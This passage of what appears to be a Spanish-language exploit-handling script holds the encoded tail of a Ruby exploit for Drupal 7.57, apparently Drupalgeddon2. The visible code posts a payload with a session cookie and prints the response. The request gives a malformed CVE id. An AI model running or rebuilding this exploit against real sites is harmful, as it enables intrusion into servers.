nBvc3QiLCBwYXlsb2FkLCAkc2Vzc2lvbl9jb29raWUpCiAgICAjIENoZWNrIHJlc3VsdAogICAgaWYgbm90IHJlc3BvbnNlLmJvZHkuZW1wdHk/CiAgICAgIHJlc3VsdCA9IGNsZWFuX3Jlc3VsdChyZXNwb25zZS5ib2R5KQogICAgZW5kCiAgZW5kCiAgIyBGZWVkYmFjawogIHB1dHMgcmVzdWx0CmVuZA==",
    "extension":"ruby",
    "cve":"CVE-2018-002",
    "software":{
        "nombre":"Drupal",
        "version":"7.57"
    }
}
ejecutar4(peticion, headers)

# peticion = {"exploit":"ruby_drupalgeddon2.rb"}
# ejecutar5(peticion, headers)